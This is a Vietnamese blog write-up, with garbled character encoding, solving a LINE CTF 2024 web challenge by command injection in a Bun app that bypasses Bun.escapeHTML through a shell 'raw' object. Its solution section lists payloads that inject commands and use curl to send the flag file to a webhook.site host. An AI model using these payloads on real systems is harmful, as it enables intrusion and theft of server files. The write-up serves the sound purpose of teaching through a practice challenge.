---
title: "LINE CTF 2024 - web writeup"
excerpt: "March 23, 2024, 09:00 AM ~ March 24, 2024, 09:00 AM (UTC+9) ğŸ’»"
header:
show_date: true
header:
  teaser: /assets/images/images-ctf/2024-03-20-LineCTF-2024/teaser.png
  teaser_home_page: true
  icon: /assets/images/images-icon/ctf.png
  overlay_image: /assets/images/images-ctf/2024-03-20-LineCTF-2024/background.png
categories:
  - CTF
tags:
  - CTF
  - Vietnamese
---

# Boom Boom Hell* - 176 point/28 solved
## Description
```
Shall we dance? ğŸ»ğŸ¥ğŸ°ğŸ¶
URL: http://34.146.180.210:3000/chall?url=https://www.lycorp.co.jp
```

source code [here](https://github.com/TaiPhung217/CTF_writeup/blob/main/2024/linectf2024/boomboomhell_898a5dc8c4b2ea241905c612d355ce58.zip)

## Solution

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-ctf/2024-03-20-LineCTF-2024/image1.png)

Source code index.js khÃ´ng quÃ¡ dÃ i, chÆ°Æ¡ng trÃ¬nh chá»©a má»™t api `/chall` vá»›i param `url`. 

á» dÃ²ng code thá»© 23 vÃ  28 ráº¥t dá»… tháº¥ycÃ³ lá»—i command injection, mÃ¬nh sáº½ thá»±c hiá»‡n khai thÃ¡c theo flow nhÆ° sau:

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-ctf/2024-03-20-LineCTF-2024/image2.png)

Táº¡i dÃ²ng 28. ta cÃ³ thá»ƒ tháº¥y code thá»±c ghi má»™t sá»‘ dá»¯ liá»‡u dáº¡ng datetime vÃ  url truyá»n tá»« input vÃ o file `.log` . LÃ m mÃ¬nh nhá»› tá»›i má»™t dáº¡ng ghi payload vÃ o file rá»“i gá»i tá»›i file vá»›i bash Ä‘á»ƒ thá»±c thi. NhÆ°ng khÃ´ng pháº£i. 

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-ctf/2024-03-20-LineCTF-2024/image3.png)

Thá»±c táº¿, tham sá»‘ `url` Ä‘Æ°á»£c xá»­ lÃ½ trÆ°á»›c báº±ng hÃ m `escapeHTML()` cá»§a `bun`. Ban Ä‘áº§u mÃ¬nh nghÄ© khÃ³ khÄƒn á»Ÿ Ä‘Ã¢y lÃ  cáº§n pháº£i vÆ°á»£t qua hÃ m nÃ y sao cho Ä‘á»™ dÃ i chuá»—i gá»‘c vÃ  sau khi escape khÃ´ng khÃ¡c nhau bao gá»“m kÃ½ tá»± Ä‘áº·c biá»‡t Ä‘á»ƒ thá»±c thi mÃ£..

```js
if (params.url.length < escapeHTML(params.url).length) {    // dislike suspicious chars
    return new Response("sorry, but the given URL is too complex for me");
}
```

`Bun.escapeHTML()` utility Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ escape cÃ¡c kÃ½ tá»± HTML trong cÃ¡c chuá»—i. CÃ¡c kiá»ƒu khÃ´ng pháº£i lÃ  chuá»—i sáº½ Ä‘Æ°á»£c chuyá»ƒn thÃ nh chuá»—i trÆ°á»›c khi thá»±c hiá»‡n escape. Viá»‡c thay tháº¿ Ä‘Æ°á»£c thá»±c hiá»‡n gá»“m: 
```js
" becomes "&quot;"
& becomes "&amp;"
' becomes "&#x27;"
< becomes "&lt;"
> becomes "&gt;"
```

ex:
```js
Bun.escapeHTML("<script>alert('Hello World!')</script>");
// &lt;script&gt;alert(&#x27;Hello World!&#x27;)&lt;&#x2F;script&gt;
```
Tham kháº£o [escape-html](https://bun.sh/guides/util/escape-html) hoáº·c Ä‘Ã¢y [https://github.com/oven-sh/bun/blob/71113182c2a5228b447b836ad4b7bf705ad7e06d/test/js/bun/util/escapeHTML.test.js#L23](https://github.com/oven-sh/bun/blob/71113182c2a5228b447b836ad4b7bf705ad7e06d/test/js/bun/util/escapeHTML.test.js#L23)

MÃ¬nh nghÄ© viá»‡c thÃªm escapeHTML á»Ÿ Ä‘Ã¢y nhÆ° má»™t cÃº lá»«a váº­y. Bá»Ÿi vÃ¬ mÃ¬nh nghÄ© khÃ¡ dá»… Ä‘á»ƒ bypass Ä‘Æ°á»£c filter nÃ y mÃ  khÃ´ng cáº§n tá»›i cÃ¡c kÃ½ tá»± Ä‘áº·c biá»‡t thuá»™c blacklist cá»§a `escapeHTML()`.

TrÆ°á»›c tiÃªn, xÃ©t tá»›i pháº§n sink. PhÃ¢n tÃ­ch cÃº phÃ¡p bun shell . Bun shell lÃ  má»™t ngÃ´n ngá»¯ nhÃºng thá»­ nghiá»‡m , trÃ¬nh thÃ´ng dá»‹ch má»›i tá»ng Bun, cho phÃ©p cháº¡y cÃ¡c táº­p lá»‡nh shell Ä‘a ná»n táº£ng trong JS vÃ  Typescript. NÃ³i tá»›i logic escape cá»§a Bun shell dÆ°á»›i dáº¡ng má»™t function.

```js
import { $ } from "bun";

console.log($.escape('$(foo) `bar` "baz"'));
// => \$(foo) \`bar\` \"baz\"
```

Náº¿u khÃ´ng muá»‘n chuá»—i output bá»‹ escape, chá»‰ cáº§n bá»c nÃ³ trong má»™t object `{ raw: 'str' }`
```js
import { $ } from "bun";

await $`echo ${{ raw: '$(foo) `bar` "baz"' }}`;
// => bun: command not found: foo
// => bun: command not found: bar
// => baz
```

Tham kháº£o [https://bun.sh/docs/runtime/shell#escape-escape-strings](https://bun.sh/docs/runtime/shell#escape-escape-strings)

Tá»« vÃ­ dá»¥ trÃªn mÃ¬nh cÃ³ Ä‘Æ°á»£c 2 Ã½ tÆ°á»Ÿng Ä‘á»ƒ chÃ¨n payload: `$(cat /flag)` hoáº·c `{% raw %}`cat /flag`{% endraw %}`.

LÃºc nÃ y, viá»‡c thÃªm má»™t object tá»« `param.url` thÃ¬ data nÃ y sau khi Ä‘Æ°á»£c parse bá»Ÿi `${}` sáº½ tráº£ vá» Ä‘á»‹nh dáº¡ng raw ban Ä‘áº§u. Káº¿t há»£p vá»›i lá»‡nh `node/curl` trÆ°á»›c Ä‘Ã³ Ä‘á»ƒ táº¡o thÃ nh má»™t command injection payload. Vá»›i dÃ²ng code `qs.parse(url.search, {ignoreQueryPrefix: true});` khi truyá»n `url[raw]=$(payload)` sáº½ trá»Ÿ thÃ nh má»™t object 

```js
{
    "raw": $payload
}
```

Payload Ä‘Æ°á»£c truyá»n tá»›i sink . LÃºc nÃ y `$(param.url)` sáº½ khÃ´ng Ä‘Æ°á»£c escape vÃ  sáº½ Ä‘Æ°á»£c thá»±c thi., mÃ¬nh nghÄ© cÃ³ thá»ƒ thÃªm cÃ¡ch thá»© 3 chá»‰ cáº§n thÃªm phÃ¢n tÃ¡ch lá»‡nh Ä‘á»ƒ bypass thÃ´i nhÆ° `;id;`, `|id|`

NhÆ°ng vá»›i payload nhÆ° nÃ y thÃ¬ mÃ¬nh nghÄ© chá»‰ khai thÃ¡c cmi Ä‘Æ°á»£c á»Ÿ dÃ²ng code thá»© 28 thÃ´i. VÃ¬ káº¿t quáº£ tráº£ vá» khi truyá»n object cá»§a cÃº phÃ¡p `${lyURL}` sáº½ gá»i tá»›i `toString` cá»§a nÃ³ chÃ­nh lÃ  `https://www.lycorp.co.jp/[object%20Object]` khÃ´ng bao gá»“m payload nÃªn khÃ´ng thá»±c thi Ä‘Æ°á»£c. 
```sh
curl -sL https://www.lycorp.co.jp/[object%20Object]
```

Object `URL`: 
![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-ctf/2024-03-20-LineCTF-2024/image4.png)

`toString` cá»§a `URL` sáº½ tráº£ vá» `href` xem trong /blob/mastere/url.d.ts#L503
```text
* Getting the value of the `href` property is equivalent to calling {@link toString}.
```

Quay trá»Ÿ láº¡i vá»›i payload Ä‘ang nÃ³i trÆ°á»›c Ä‘Ã³ 

Test vá»›i payload: `/chall?url[raw]=;id;`

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-ctf/2024-03-20-LineCTF-2024/image5.png)

Test local xong. Tiáº¿p theo chá»‰ viá»‡c gá»i command `curl` tá»›i webhook Ä‘á»ƒ láº¥y flag. 

NhÆ° mÃ¬nh Ä‘Ã£ giáº£i thÃ­ch á»Ÿ trÃªn, cuá»‘i cÃ¹ng cÃ³ 3 cÃ¡ch Ä‘á»ƒ lÃ m bÃ i nÃ y:
```bash
/chall?url[raw]=`curl+https://webhook.site/xxxxx+-d+@/flag`
```

hoáº·c 

```bash
/chall?url[raw]=$(curl+https://webhook.site/xxxx+-d+@/flag)
```

hoáº·c 
```bash
/chall?url[raw]=;curl+https://webhook.site/xxxxx+-d+@/flag;
```

## Unintended
CÃ³ má»™t cÃ¡ch khÃ¡c Ä‘á»ƒ khai thÃ¡c Ä‘Æ°á»£c dÃ²ng dÃ²ng 23. MÃ  khÃ´ng pháº£i truyá»n vÃ o má»™t object:

```js
/chall?url=https://www.lycorp.co.jp/?`1`file:///flag
```

![alt]({{ site.url }}{{ site.baseurl }}/assets/images/images-ctf/2024-03-20-LineCTF-2024/image6.png)


Ai Ä‘Ã³ Ä‘Ã£ report bug vá» `escapeHTML()` ngay sau khi CTF nÃ y káº¿t thÃºc. [https://github.com/oven-sh/bun/pull/9619](https://github.com/oven-sh/bun/pull/9619)